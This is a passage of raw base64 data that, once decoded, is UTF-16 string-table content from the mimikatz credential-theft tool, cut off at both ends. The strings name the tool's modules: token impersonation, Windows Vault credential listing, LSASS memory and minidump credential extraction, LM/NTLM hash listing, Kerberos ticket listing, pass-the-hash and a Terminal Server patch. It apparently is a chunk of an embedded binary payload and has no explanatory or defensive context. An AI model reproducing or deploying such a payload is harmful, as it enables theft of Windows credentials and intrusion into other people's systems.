QAaQBvAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGcAZQBuAGUAcgBpAGMARgB1AG4AYwB0AGkAbwBuACAAOwAgAE0AaQBzAHMAaQBuAGcAIABzAGUAcgB2AGkAYwBlACAAbgBhAG0AZQAgAGEAcgBnAHUAbQBlAG4AdAAKAAAAAABTAHQAYQByAHQAaQBuAGcAAAAAAFIAZQBtAG8AdgBpAG4AZwAAAAAAUwB0AG8AcABwAGkAbgBnAAAAAABTAHUAcwBwAGUAbgBkAGkAbgBnAAAAAABSAGUAcwB1AG0AaQBuAGcAAAAAAEQAaQBzAHAAbABhAHkAIABzAG8AbQBlACAAdgBlAHIAcwBpAG8AbgAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAAAAdgBlAHIAcwBpAG8AbgAAAAAAAABTAHcAaQB0AGMAaAAgAGYAaQBsAGUAIABvAHUAdABwAHUAdAAvAGIAYQBzAGUANgA0ACAAbwB1AHQAcAB1AHQAAAAAAGIAYQBzAGUANgA0AAAAAAAAAAAATABvAGcAIABtAGkAbQBpAGsAYQB0AHoAIABpAG4AcAB1AHQALwBvAHUAdABwAHUAdAAgAHQAbwAgAGYAaQBsAGUAAAAAAAAAUwBsAGUAZQBwACAAYQBuACAAYQBtAG8AdQBuAHQAIABvAGYAIABtAGkAbABsAGkAcwBlAGMAbwBuAGQAcwAAAHMAbABlAGUAcAAAAAAAAABBAG4AcwB3AGUAcgAgAHQAbwAgAHQAaABlACAAVQBsAHQAaQBtAGEAdABlACAAUQB1AGUAcwB0AGkAbwBuACAAbwBmACAATABpAGYAZQAsACAAdABoAGUAIABVAG4AaQB2AGUAcgBzAGUALAAgAGEAbgBkACAARQB2AGUAcgB5AHQAaABpAG4AZwAAAGEAbgBzAHcAZQByAAAAAAAAAAAAQwBsAGUAYQByACAAcwBjAHIAZQBlAG4AIAAoAGQAbwBlAHMAbgAnAHQAIAB3AG8AcgBrACAAdwBpAHQAaAAgAHIAZQBkAGkAcgBlAGMAdABpAG8AbgBzACwAIABsAGkAawBlACAAUABzAEUAeABlAGMAKQAAAAAAYwBsAHMAAABRAHUAaQB0ACAAbQBpAG0AaQBrAGEAdAB6AAAAZQB4AGkAdAAAAAAAQgBhAHMAaQBjACAAYwBvAG0AbQBhAG4AZABzACAAKABkAG8AZQBzACAAbgBvAHQAIAByAGUAcQB1AGkAcgBlACAAbQBvAGQAdQBsAGUAIABuAGEAbQBlACkAAABTAHQAYQBuAGQAYQByAGQAIABtAG8AZAB1AGwAZQAAAHMAdABhAG4AZABhAHIAZAAAAAAAQgB5AGUAIQAKAAAANAAyAC4ACgAAAAAAUwBsAGUAZQBwACAAOgAgACUAdQAgAG0AcwAuAC4ALgAgAAAARQBuAGQAIAAhAAoAAAAAAG0AaQBtAGkAawBhAHQAegAuAGwAbwBnAAAAAABVAHMAaQBuAGcAIAAnACUAcwAnACAAZgBvAHIAIABsAG8AZwBmAGkAbABlACAAOgAgACUAcwAKAAAAAAB0AHIAdQBlAAAAAABmAGEAbABzAGUAAABpAHMAQgBhAHMAZQA2ADQASQBuAHQAZQByAGMAZQBwAHQAIAB3AGEAcwAgACAAIAAgADoAIAAlAHMACgAAAAAAaQBzAEIAYQBzAGUANgA0AEkAbgB0AGUAcgBjAGUAcAB0ACAAaQBzACAAbgBvAHcAIAA6ACAAJQBzAAoAAAAAADYANAAAAAAAOAA2AAAAAAAAAAAACgBtAGkAbQBpAGsAYQB0AHoAIAAyAC4AMAAgAGEAbABwAGgAYQAgACgAYQByAGMAaAAgAHgAOAA2ACkACgBOAFQAIAAgACAAIAAgAC0AIAAgAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAlAHUALgAlAHUAIABiAHUAaQBsAGQAIAAlAHUAIAAoAGEAcgBjAGgAIAB4ACUAcwApAAoAAAAAAFAAcgBpAG0AYQByAHkAAABVAG4AawBuAG8AdwBuAAAARABlAGwAZQBnAGEAdABpAG8AbgAAAAAASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgAAAEkAZABlAG4AdABpAGYAaQBjAGEAdABpAG8AbgAAAAAAQQBuAG8AbgB5AG0AbwB1AHMAAABSAGUAdgBlAHIAdAAgAHQAbwAgAHAAcgBvAGMAZQBzACAAdABvAGsAZQBuAAAAAAByAGUAdgBlAHIAdAAAAAAASQBtAHAAZQByAHMAbwBuAGEAdABlACAAYQAgAHQAbwBrAGUAbgAAAGUAbABlAHYAYQB0AGUAAABMAGkAcwB0ACAAYQBsAGwAIAB0AG8AawBlAG4AcwAgAG8AZgAgAHQAaABlACAAcwB5AHMAdABlAG0AAABEAGkAcwBwAGwAYQB5ACAAYwB1AHIAcgBlAG4AdAAgAGkAZABlAG4AdABpAHQAeQAAAAAAdwBoAG8AYQBtAGkAAAAAAFQAbwBrAGUAbgAgAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuACAAbQBvAGQAdQBsAGUAAAB0AG8AawBlAG4AAAAgACoAIABQAHIAbwBjAGUAcwBzACAAVABvAGsAZQBuACAAOgAgAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwB3AGgAbwBhAG0AaQAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAACAAKgAgAFQAaAByAGUAYQBkACAAVABvAGsAZQBuACAAIAA6ACAAAABuAG8AIAB0AG8AawBlAG4ACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAHcAaABvAGEAbQBpACAAOwAgAE8AcABlAG4AVABoAHIAZQBhAGQAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAABkAG8AbQBhAGkAbgBhAGQAbQBpAG4AAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwBsAGkAcwB0AF8AbwByAF8AZQBsAGUAdgBhAHQAZQAgADsAIABrAHUAbABsAF8AbQBfAGwAbwBjAGEAbABfAGQAbwBtAGEAaQBuAF8AdQBzAGUAcgBfAGcAZQB0AEMAdQByAHIAZQBuAHQARABvAG0AYQBpAG4AUwBJAEQAIAAoADAAeAAlADAAOAB4ACkACgAAAHMAeQBzAHQAZQBtAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlACAAOwAgAE4AbwAgAHUAcwBlAHIAbgBhAG0AZQAgAGEAdgBhAGkAbABhAGIAbABlACAAdwBoAGUAbgAgAFMAWQBTAFQARQBNAAoAAABUAG8AawBlAG4AIABJAGQAIAAgADoAIAAlAHUACgBVAHMAZQByACAAbgBhAG0AZQAgADoAIAAlAHMACgBTAEkARAAgAG4AYQBtAGUAIAAgADoAIAAAAAAAJQBzAFwAJQBzAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAIAA7ACAAawB1AGwAbABfAG0AXwB0AG8AawBlAG4AXwBnAGUAdABOAGEAbQBlAEQAbwBtAGEAaQBuAEYAcgBvAG0AUwBJAEQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdABvAGsAZQBuAF8AbABpAHMAdABfAG8AcgBfAGUAbABlAHYAYQB0AGUAIAA7ACAAawB1AGwAbABfAG0AXwBsAG8AYwBhAGwAXwBkAG8AbQBhAGkAbgBfAHUAcwBlAHIAXwBDAHIAZQBhAHQAZQBXAGUAbABsAEsAbgBvAHcAbgBTAGkAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAHIAZQB2AGUAcgB0ACAAOwAgAFMAZQB0AFQAaAByAGUAYQBkAFQAbwBrAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAlAC0AMQAwAHUACQAAAAAAJQBzAFwAJQBzAAkAJQBzAAAAAAAJACgAJQAwADIAdQBnACwAJQAwADIAdQBwACkACQAlAHMAAAAgACgAJQBzACkAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHQAbwBrAGUAbgBfAGwAaQBzAHQAXwBvAHIAXwBlAGwAZQB2AGEAdABlAF8AYwBhAGwAbABiAGEAYwBrACAAOwAgAEMAaABlAGMAawBUAG8AawBlAG4ATQBlAG0AYgBlAHIAcwBoAGkAcAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAlAHUACQAAACAALQA+ACAASQBtAHAAZQByAHMAbwBuAGEAdABlAGQAIAAhAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB0AG8AawBlAG4AXwBsAGkAcwB0AF8AbwByAF8AZQBsAGUAdgBhAHQAZQBfAGMAYQBsAGwAYgBhAGMAawAgADsAIABTAGUAdABUAGgAcgBlAGEAZABUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAWwBlAHgAcABlAHIAaQBtAGUAbgB0AGEAbABdACAAcABhAHQAYwBoACAAVABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABzAGUAcgB2AGkAYwBlACAAdABvACAAYQBsAGwAbwB3ACAAbQB1AGwAdABpAHAAbABlAHMAIAB1AHMAZQByAHMAAABtAHUAbAB0AGkAcgBkAHAAAAAAAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAAbQBvAGQAdQBsAGUAAAAAAHQAcwAAAAAAdABlAHIAbQBzAHIAdgAuAGQAbABsAAAAVABlAHIAbQBTAGUAcgB2AGkAYwBlAAAAZABvAG0AYQBpAG4AXwBlAHgAdABlAG4AZABlAGQAAABnAGUAbgBlAHIAaQBjAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAAAAZABvAG0AYQBpAG4AXwB2AGkAcwBpAGIAbABlAF8AcABhAHMAcwB3AG8AcgBkAAAAZABvAG0AYQBpAG4AXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAAAAAAGQAbwBtAGEAaQBuAF8AcABhAHMAcwB3AG8AcgBkAAAAZwBlAG4AZQByAGkAYwAAAEIAaQBvAG0AZQB0AHIAaQBjAAAAUABpAGMAdAB1AHIAZQAgAFAAYQBzAHMAdwBvAHIAZAAAAAAAUABpAG4AIABMAG8AZwBvAG4AAABEAG8AbQBhAGkAbgAgAEUAeAB0AGUAbgBkAGUAZAAAAEQAbwBtAGEAaQBuACAAQwBlAHIAdABpAGYAaQBjAGEAdABlAAAAAABEAG8AbQBhAGkAbgAgAFAAYQBzAHMAdwBvAHIAZAAAAGMAcgBlAGQAAAAAAFcAaQBuAGQAbwB3AHMAIABWAGEAdQBsAHQALwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAbQBvAGQAdQBsAGUAAAB2AGEAdQBsAHQAAAB2AGEAdQBsAHQAYwBsAGkAAAAAAFZhdWx0RW51bWVyYXRlSXRlbVR5cGVzAFZhdWx0RW51bWVyYXRlVmF1bHRzAAAAAFZhdWx0T3BlblZhdWx0AABWYXVsdEdldEluZm9ybWF0aW9uAFZhdWx0RW51bWVyYXRlSXRlbXMAVmF1bHRDbG9zZVZhdWx0AFZhdWx0RnJlZQAAAFZhdWx0R2V0SXRlbQAAAAAKAFYAYQB1AGwAdAAgADoAIAAAAAkASQB0AGUAbQBzACAAKAAlAHUAKQAKAAAAAAAJACAAJQAyAHUALgAJACUAcwAKAAAAAAAJAAkAVAB5AHAAZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAAAAkACQBMAGEAcwB0AFcAcgBpAHQAdABlAG4AIAAgACAAIAAgADoAIAAAAAAACQAJAEYAbABhAGcAcwAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgACUAMAA4AHgACgAAAAkACQBSAGUAcwBzAG8AdQByAGMAZQAgACAAIAAgACAAIAAgADoAIAAAAAAACQAJAEkAZABlAG4AdABpAHQAeQAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAJAAkAQQB1AHQAaABlAG4AdABpAGMAYQB0AG8AcgAgACAAIAA6ACAAAAAAAAkACQBQAHIAbwBwAGUAcgB0AHkAIAAlADIAdQAgACAAIAAgACAAOgAgAAAACQAJACoAQQB1AHQAaABlAG4AdABpAGMAYQB0AG8AcgAqACAAOgAgAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0ACAAOwAgAFYAYQB1AGwAdABHAGUAdABJAHQAZQBtADcAIAA6ACAAJQAwADgAeAAAAAAACQAJAFAAYQBjAGsAYQBnAGUAUwBpAGQAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0ACAAOwAgAFYAYQB1AGwAdABHAGUAdABJAHQAZQBtADgAIAA6ACAAJQAwADgAeAAAAAAACgAJAAkAKgAqACoAIAAlAHMAIAAqACoAKgAKAAAAAAAJAAkAVQBzAGUAcgAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAAACUAcwBcACUAcwAAAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBcAEwAbwBnAG8AbgBVAEkAXABQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZAAAAAAAYgBnAFAAYQB0AGgAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAXwBkAGUAcwBjAEkAdABlAG0AXwBQAEkATgBMAG8AZwBvAG4ATwByAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAE8AcgBCAGkAbwBtAGUAdAByAGkAYwAgADsAIABSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgADIAIAA6ACAAJQAwADgAeAAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdABfAGQAZQBzAGMASQB0AGUAbQBfAFAASQBOAEwAbwBnAG8AbgBPAHIAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQATwByAEIAaQBvAG0AZQB0AHIAaQBjACAAOwAgAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAMQAgADoAIAAlADAAOAB4AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0AF8AZABlAHMAYwBJAHQAZQBtAF8AUABJAE4ATABvAGcAbwBuAE8AcgBQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIABTAEkARAAgADoAIAAlADAAOAB4AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAXwBkAGUAcwBjAEkAdABlAG0AXwBQAEkATgBMAG8AZwBvAG4ATwByAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAE8AcgBCAGkAbwBtAGUAdAByAGkAYwAgADsAIABDAG8AbgB2AGUAcgB0AFMAaQBkAFQAbwBTAHQAcgBpAG4AZwBTAGkAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0AF8AZABlAHMAYwBJAHQAZQBtAF8AUABJAE4ATABvAGcAbwBuAE8AcgBQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIABQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZAAgADoAIAAlADAAOAB4AAoAAAAAAAkACQBQAGEAcwBzAHcAbwByAGQAIAAgACAAIAAgACAAIAAgADoAIAAAAAAACQAJAFAASQBOACAAQwBvAGQAZQAgACAAIAAgACAAIAAgACAAOgAgACUAMAA0AGgAdQAKAAAAAAAJAAkAQgBhAGMAawBnAHIAbwB1AG4AZAAgAHAAYQB0AGgAIAA6ACAAJQBzAAoAAAAJAAkAUABpAGMAdAB1AHIAZQAgAHAAYQBzAHMAdwBvAHIAZAAgACgAZwByAGkAZAAgAGkAcwAgADEANQAwACoAMQAwADAAKQAKAAAACQAJACAAWwAlAHUAXQAgAAAAAABwAG8AaQBuAHQAIAAgACgAeAAgAD0AIAAlADMAdQAgADsAIAB5ACAAPQAgACUAMwB1ACkAAAAAAGMAbABvAGMAawB3AGkAcwBlAAAAYQBuAHQAaQBjAGwAbwBjAGsAdwBpAHMAZQAAAGMAaQByAGMAbABlACAAKAB4ACAAPQAgACUAMwB1ACAAOwAgAHkAIAA9ACAAJQAzAHUAIAA7ACAAcgAgAD0AIAAlADMAdQApACAALQAgACUAcwAAAAAAAABsAGkAbgBlACAAIAAgACgAeAAgAD0AIAAlADMAdQAgADsAIAB5ACAAPQAgACUAMwB1ACkAIAAtAD4AIAAoAHgAIAA9ACAAJQAzAHUAIAA7ACAAeQAgAD0AIAAlADMAdQApAAAAJQB1AAoAAAAJAAkAUAByAG8AcABlAHIAdAB5ACAAIAAgACAAIAAgACAAIAA6ACAAAAAAACUALgAqAHMAXAAAACUALgAqAHMAAAAAAHQAbwBkAG8AIAA/AAoAAAAJAE4AYQBtAGUAIAAgACAAIAAgACAAIAA6ACAAJQBzAAoAAAB0AGUAbQBwACAAdgBhAHUAbAB0AAAAAAAJAFAAYQB0AGgAIAAgACAAIAAgACAAIAA6ACAAJQBzAAoAAAAlAGgAdQAAACUAdQAAAAAAWwBUAHkAcABlACAAJQB1AF0AIAAAAAAAbABzAGEAcwByAHYALgBkAGwAbAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBjAHIAZQBkACAAOwAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGMAcgBlAGQAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAHQAVgBlAHIAeQBCAGEAcwBpAGMATQBvAGQAdQBsAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAHMARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBjAHIAZQBkACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBjAHIAZQBkACAAOwAgAGsAdQBsAGwAXwBtAF8AcwBlAHIAdgBpAGMAZQBfAGcAZQB0AFUAbgBpAHEAdQBlAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAD8AIAAoAHQAeQBwAGUAIAA+ACAAQwBSAEUARABfAFQAWQBQAEUAXwBNAEEAWABJAE0AVQBNACkAAAAAADwATgBVAEwATAA+AAAAAAAAAAAAVABhAHIAZwBlAHQATgBhAG0AZQAgADoAIAAlAHMAIAAvACAAJQBzAAoAVQBzAGUAcgBOAGEAbQBlACAAIAAgADoAIAAlAHMACgBDAG8AbQBtAGUAbgB0ACAAIAAgACAAOgAgACUAcwAKAFQAeQBwAGUAIAAgACAAIAAgACAAIAA6ACAAJQB1ACAALQAgACUAcwAKAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAA6ACAAAAAKAAoAAAAAAGwAcwBhAHMAcgB2AAAAAABMc2FJQ2FuY2VsTm90aWZpY2F0aW9uAABMc2FJUmVnaXN0ZXJOb3RpZmljYXRpb24AAAAAYgBjAHIAeQBwAHQAAAAAAEJDcnlwdE9wZW5BbGdvcml0aG1Qcm92aWRlcgBCQ3J5cHRTZXRQcm9wZXJ0eQAAAEJDcnlwdEdldFByb3BlcnR5AAAAQkNyeXB0R2VuZXJhdGVTeW1tZXRyaWNLZXkAAEJDcnlwdEVuY3J5cHQAAABCQ3J5cHREZWNyeXB0AAAAQkNyeXB0RGVzdHJveUtleQAAAABCQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyAAAAADMARABFAFMAAAAAAEMAaABhAGkAbgBpAG4AZwBNAG8AZABlAEMAQgBDAAAAQwBoAGEAaQBuAGkAbgBnAE0AbwBkAGUAAAAAAE8AYgBqAGUAYwB0AEwAZQBuAGcAdABoAAAAAABBAEUAUwAAAEMAaABhAGkAbgBpAG4AZwBNAG8AZABlAEMARgBCAAAAQwBhAGMAaABlAGQAVQBuAGwAbwBjAGsAAAAAAEMAYQBjAGgAZQBkAFIAZQBtAG8AdABlAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAAAEMAYQBjAGgAZQBkAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAAAFIAZQBtAG8AdABlAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAAAE4AZQB3AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAAAATgBlAHQAdwBvAHIAawBDAGwAZQBhAHIAdABlAHgAdAAAAAAAVQBuAGwAbwBjAGsAAAAAAFAAcgBvAHgAeQAAAFMAZQByAHYAaQBjAGUAAABCAGEAdABjAGgAAABOAGUAdAB3AG8AcgBrAAAASQBuAHQAZQByAGEAYwB0AGkAdgBlAAAAVQBuAGsAbgBvAHcAbgAgACEAAABVAG4AZABlAGYAaQBuAGUAZABMAG8AZwBvAG4AVAB5AHAAZQAAAAAATABpAHMAdAAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAE0AYQBuAGEAZwBlAHIAAAAAAGMAcgBlAGQAbQBhAG4AAABMAGkAcwB0ACAAQwBhAGMAaABlAGQAIABNAGEAcwB0AGUAcgBLAGUAeQBzAAAAAABkAHAAYQBwAGkAAABMAGkAcwB0ACAASwBlAHIAYgBlAHIAbwBzACAARQBuAGMAcgB5AHAAdABpAG8AbgAgAEsAZQB5AHMAAABlAGsAZQB5AHMAAABMAGkAcwB0ACAASwBlAHIAYgBlAHIAbwBzACAAdABpAGMAawBlAHQAcwAAAHQAaQBjAGsAZQB0AHMAAABQAGEAcwBzAC0AdABoAGUALQBoAGEAcwBoAAAAcAB0AGgAAABTAHcAaQB0AGMAaAAgACgAbwByACAAcgBlAGkAbgBpAHQAKQAgAHQAbwAgAEwAUwBBAFMAUwAgAG0AaQBuAGkAZAB1AG0AcAAgAGMAbwBuAHQAZQB4AHQAAAAAAG0AaQBuAGkAZAB1AG0AcAAAAAAAUwB3AGkAdABjAGgAIAAoAG8AcgAgAHIAZQBpAG4AaQB0ACkAIAB0AG8AIABMAFMAQQBTAFMAIABwAHIAbwBjAGUAcwBzACAAIABjAG8AbgB0AGUAeAB0AAAAAAAAAAAAUwBlAGEAcgBjAGgAIABpAG4AIABMAFMAQQBTAFMAIABtAGUAbQBvAHIAeQAgAHMAZQBnAG0AZQBuAHQAcwAgAHMAbwBtAGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAAAAHMAZQBhAHIAYwBoAFAAYQBzAHMAdwBvAHIAZABzAAAAAAAAAEwAaQBzAHQAcwAgAGEAbABsACAAYQB2AGEAaQBsAGEAYgBsAGUAIABwAHIAbwB2AGkAZABlAHIAcwAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAGwAbwBnAG8AbgBQAGEAcwBzAHcAbwByAGQAcwAAAAAATABpAHMAdABzACAAUwBTAFAAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAABzAHMAcAAAAEwAaQBzAHQAcwAgAEwAaQB2AGUAUwBTAFAAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAABsAGkAdgBlAHMAcwBwAAAATABpAHMAdABzACAAVABzAFAAawBnACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAdABzAHAAawBnAAAATABpAHMAdABzACAASwBlAHIAYgBlAHIAbwBzACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAAABMAGkAcwB0AHMAIABXAEQAaQBnAGUAcwB0ACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAdwBkAGkAZwBlAHMAdAAAAEwAaQBzAHQAcwAgAEwATQAgACYAIABOAFQATABNACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAbQBzAHYAAAAAAAAAUwBvAG0AZQAgAGMAbwBtAG0AYQBuAGQAcwAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAC4ALgAuAAAAUwBlAGsAdQByAEwAUwBBACAAbQBvAGQAdQBsAGUAAABzAGUAawB1AHIAbABzAGEAAAAAAFMAdwBpAHQAYwBoACAAdABvACAAUABSAE8AQwBFAFMAUwAKAAAAAABTAHcAaQB0AGMAaAAgAHQAbwAgAE0ASQBOAEkARABVAE0AUAAgADoAIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAG0AaQBuAGkAZAB1AG0AcAAgADsAIAA8AG0AaQBuAGkAZAB1AG0AcABmAGkAbABlAC4AZABtAHAAPgAgAGEAcgBnAHUAbQBlAG4AdAAgAGkAcwAgAG0AaQBzAHMAaQBuAGcACgAAAAAAAAAAAE8AcABlAG4AaQBuAGcAIAA6ACAAJwAlAHMAJwAgAGYAaQBsAGUAIABmAG8AcgAgAG0AaQBuAGkAZAB1AG0AcAAuAC4ALgAKAAAAAABsAHMAYQBzAHMALgBlAHgAZQAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABMAFMAQQBTAFMAIABwAHIAbwBjAGUAcwBzACAAbgBvAHQAIABmAG8AdQBuAGQAIAAoAD8AKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AaQBuAGkAZAB1AG0AcAAgAHAASQBuAGYAbwBzAC0APgBNAGEAagBvAHIAVgBlAHIAcwBpAG8AbgAgACgAJQB1ACkAIAAhAD0AIABNAEkATQBJAEsAQQBUAFoAXwBOAFQAXwBNAEEASgBPAFIAXwBWAEUAUgBTAEkATwBOACAAKAAlAHUAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AaQBuAGkAZAB1AG0AcAAgAHAASQBuAGYAbwBzAC0APgBQAHIAbwBjAGUAcwBzAG8AcgBBAHIAYwBoAGkAdABlAGMAdAB1AHIAZQAgACgAJQB1ACkAIAAhAD0AIABQAFIATwBDAEUAUwBTAE8AUgBfAEEAUgBDAEgASQBUAEUAQwBUAFUAUgBFAF8ASQBOAFQARQBMACAAKAAlAHUAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AaQBuAGkAZAB1AG0AcAAgAHcAaQB0AGgAbwB1AHQAIABTAHkAcwB0AGUAbQBJAG4AZgBvAFMAdAByAGUAYQBtACAAKAA/ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAASwBlAHkAIABpAG0AcABvAHIAdAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATABvAGcAbwBuACAAbABpAHMAdAAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATQBvAGQAdQBsAGUAcwAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATQBlAG0AbwByAHkAIABvAHAAZQBuAGkAbgBnAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABIAGEAbgBkAGwAZQAgAG8AbgAgAG0AZQBtAG8AcgB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEwAbwBjAGEAbAAgAEwAUwBBACAAbABpAGIAcgBhA